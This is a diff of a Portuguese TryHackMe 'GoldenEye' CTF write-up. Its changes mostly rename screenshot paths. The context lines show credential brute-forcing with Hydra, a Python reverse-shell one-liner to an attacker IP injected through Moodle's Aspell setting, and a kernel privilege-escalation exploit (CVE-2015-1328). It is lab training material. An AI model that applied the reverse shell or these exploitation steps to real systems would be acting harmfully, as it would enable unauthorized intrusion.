@@ -33,7 +33,7 @@ PORT      STATE SERVICE     VERSION
 55007/tcp open  pop3        Dovecot pop3d
 ```
 
-![Varredura Nmap revelando SMTP, HTTP e POP3 em portas não padrão](images/01-nmap-scan.png)
+![Varredura Nmap revelando SMTP, HTTP e POP3 em portas não padrão](images/Nmap_Scan.png)
 *Figura 1 — Nmap identifica 4 portas abertas, com destaque para dois serviços POP3 (Dovecot) em portas altas não convencionais (55006/55007)*
 
 ### Explorando a página inicial
@@ -42,7 +42,7 @@ Acessando `http://10.67.176.226/sev-home/`, a página apresenta o tema "GOLDENEY
 
 > *"Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port."*
 
-![Página inicial do site com a dica sobre a porta não padrão do POP3](images/02-landing-page.png)
+![Página inicial do site com a dica sobre a porta não padrão do POP3](images/Enter_Page.png)
 *Figura 2 — A página inicial confirma que o serviço POP3 roda propositalmente em uma porta alta (55007)*
 
 ### Analisando o código-fonte (`terminal.js`)
@@ -60,7 +60,7 @@ Inspecionando o código-fonte da página e o script `terminal.js`, um comentári
 
 Decodificando as entidades HTML numéricas (cada `&#NNN;` corresponde a um caractere ASCII), obtém-se a string **`InvincibleHack3r`**.
 
-![Código-fonte do terminal.js com a senha de Boris codificada em entidades HTML, decodificada](images/03-source-code-boris-password.png)
+![Código-fonte do terminal.js com a senha de Boris codificada em entidades HTML, decodificada](./images/Password_and_Username.png)
 *Figura 3 — Senha de Boris ("InvincibleHack3r") codificada em entidades numéricas HTML no comentário do `terminal.js`*
 
 > **Observação:** essa senha "codificada" revelou-se um *red herring* (senha antiga/isca) — a senha real de Boris, obtida posteriormente por ataque de dicionário (ver Task 2), é diferente. Isso reforça o aviso do próprio comentário: *"make sure you update your default password"*.
@@ -95,7 +95,7 @@ Entre as mensagens recuperadas:
 - **De `natalya@ubuntu`**: *"Boris, I can break your codes!"* — primeira pista de que Natalya consegue quebrar as senhas de Boris.
 - **De `root@127.0.0.1.goldeneye`**: mensagem administrativa informando que essa caixa de e-mail **não é escaneada** por risco de segurança (diferente da maioria dos apps web do servidor) — um detalhe que se torna relevante mais adiante.
 
-![Hydra quebrando a senha de Boris e leitura das 3 mensagens via POP3](images/04-hydra-boris-and-emails.png)
+![Hydra quebrando a senha de Boris e leitura das 3 mensagens via POP3](./images/Breck_Pass_and_Emails_Boris.png)
 *Figura 4 — Hydra encontra `boris:secret1!`; leitura manual via Netcat revela e-mails sobre o syndicate Janus e a usuária Natalya*
 
 ### Encontrando e quebrando a senha de Dr. Doak
@@ -115,7 +115,7 @@ username: dr_doak
 password: 4England!
 ```
 
-![Hydra quebrando a senha de Doak e e-mail revelando credenciais do Moodle](images/05-hydra-doak-and-email.png)
+![Hydra quebrando a senha de Doak e e-mail revelando credenciais do Moodle](./images/Breck_Pass_and_Emails_Dr_Doak.png)
 *Figura 5 — `doak:goat` quebrado via Hydra; e-mail revela as credenciais `dr_doak / 4England!` para o site de treinamento*
 
 ### Encontrando e quebrando a senha de Natalya
@@ -140,7 +140,7 @@ password: RCP90rulez!
 
 A mensagem também instrui a adicionar uma entrada no arquivo `/etc/hosts` apontando `severnaya-station.com` para o IP do servidor, já que o acesso é feito remotamente.
 
-![Hydra quebrando a senha de Natalya e e-mails revelando o domínio Moodle e credenciais de Xenia](images/06-hydra-natalya-and-emails.png)
+![Hydra quebrando a senha de Natalya e e-mails revelando o domínio Moodle e credenciais de Xenia](images/Admin_Creds.png)
 *Figura 6 — `natalya:bird` quebrado via Hydra; e-mails revelam o domínio `severnaya-station.com/gnocertdir` e as credenciais `xenia / RCP90rulez!`*
 
 ---
@@ -175,14 +175,14 @@ Also as you may know, the RCP-90 is vastly superior to any other weapon and
 License to Kill is the only way to play.
 ```
 
-![Arquivo privado s3cret.txt de Dr. Doak indicando o caminho da imagem com a senha oculta](images/09-doak-private-file-s3cret.png)
+![Arquivo privado s3cret.txt de Dr. Doak indicando o caminho da imagem com a senha oculta](./images/s3cret.png)
 *Figura 9 — `s3cret.txt` revela que a senha de administrador foi ocultada (não em texto, para evitar scanners) em `/dir007key/for-007.jpg`*
 
 ### Login como Xenia e mensagens internas
 
 Também foi possível logar com as credenciais de **Xenia** (`xenia / RCP90rulez!`), encontradas no e-mail de Natalya, confirmando acesso ao curso "GNO" e "Miscellaneous". O navegador ainda oferece salvar a senha, evidenciando a credencial usada no login.
 
-![Login bem-sucedido como Xenia no Moodle, com popup de salvar senha](images/08-moodle-login-xenia.png)
+![Login bem-sucedido como Xenia no Moodle, com popup de salvar senha](images/Golden_Eye_Training.png)
 *Figura 8 — Login como Xenia X no Moodle (`xenia / RCP90rulez!`), com o curso GNO disponível*
 
 Verificando as mensagens internas do Moodle como Xenia, uma mensagem de **Dr. Doak** confirma seu nome de usuário de e-mail (`doak`), reforçando a cadeia de informações já obtida via POP3.
@@ -212,7 +212,7 @@ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d
 
 **Resultado:** `xWinter1995x!` — a senha de administrador do Moodle, oculta propositalmente nos metadados da imagem (e não em texto plano) para escapar dos scanners mencionados no `s3cret.txt`.
 
-![ExifTool extraindo e decodificando a senha de administrador oculta no campo Image Description](images/10-exiftool-admin-password.png)
+![ExifTool extraindo e decodificando a senha de administrador oculta no campo Image Description](./images/Admin_Creds.png)
 *Figura 10 — ExifTool revela `Image Description: eFdpbnRlcjE5OTV4IQ==`, que decodificado em Base64 resulta em `xWinter1995x!`*
 
 ### Obtendo RCE via o plugin Aspell do Moodle
@@ -225,7 +225,7 @@ O Moodle 2.2.3 é vulnerável a uma técnica conhecida de RCE: o valor desse cam
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![Configuração do campo "Path to aspell" com o payload de reverse shell em Python](images/11-moodle-aspell-rce-setup.png)
+![Configuração do campo "Path to aspell" com o payload de reverse shell em Python](./images/Created_Shell.png)
 *Figura 11 — Campo "Path to aspell" nas configurações do TinyMCE preenchido com o payload Python de reverse shell*
 
 ### Disparando o shell
@@ -247,7 +247,7 @@ connect to [192.168.129.38] from (UNKNOWN) [10.67.176.226] 38195
 $
 ```
 
-![Shell reversa obtida como www-data ao salvar a entrada do blog](images/12-reverse-shell-caught.png)
+![Shell reversa obtida como www-data ao salvar a entrada do blog](images/Reverse_Shell.png)
 *Figura 12 — Reverse shell recebida como `www-data` após o spell-checker do Moodle executar o payload*
 
 ---
@@ -260,7 +260,7 @@ Com acesso inicial como `www-data`, a enumeração do sistema (kernel Linux 3.13
 
 O exploit público (EDB-ID **37292**, autor *rebel*) foi localizado no Exploit-DB:
 
-![Página do Exploit-DB para a falha overlayfs (CVE-2015-1328, EDB-ID 37292)](images/13-exploitdb-overlayfs-cve.png)
+![Página do Exploit-DB para a falha overlayfs (CVE-2015-1328, EDB-ID 37292)](./images/Exploit_PrivEsc.png)
 *Figura 13 — Exploit-DB: "Linux Kernel 3.13.0 < 3.19 (Ubuntu) - 'overlayfs' Local Privilege Escalation" (CVE-2015-1328)*
 
 ### Compilando e executando o exploit
@@ -307,7 +307,7 @@ If you captured this make sure to go here.....
 
 A flag `568628e0d993b1973adc718237da6e93` corresponde exatamente aos "códigos de acesso finais do GoldenEye" mencionados no e-mail inicial de Alec a Boris (Task 2) — fechando a história: os códigos foram escondidos em `/root/.flag.txt`, exatamente como Alec havia solicitado.
 
-![Exploit overlayfs compilado e executado com sucesso, obtendo root e a flag final](images/14-root-flag.png)
+![Exploit overlayfs compilado e executado com sucesso, obtendo root e a flag final](images/Root_Flag_and_PrivEsc.png)
 *Figura 14 — Exploit CVE-2015-1328 compilado e executado, obtendo `uid=0(root)` e a flag em `/root/.flag.txt`*
 
 ---
@@ -353,5 +353,3 @@ A flag `568628e0d993b1973adc718237da6e93` corresponde exatamente aos "códigos d
 - Kernels desatualizados seguem sendo um vetor clássico e confiável de escalonamento de privilégios local — enumerar a versão do kernel é sempre um dos primeiros passos de pós-exploração.
 
 ---
-
-*Writeup por Mauricio Robert — TryHackMe Room: [GoldenEye](https://tryhackme.com/room/goldeneye)*
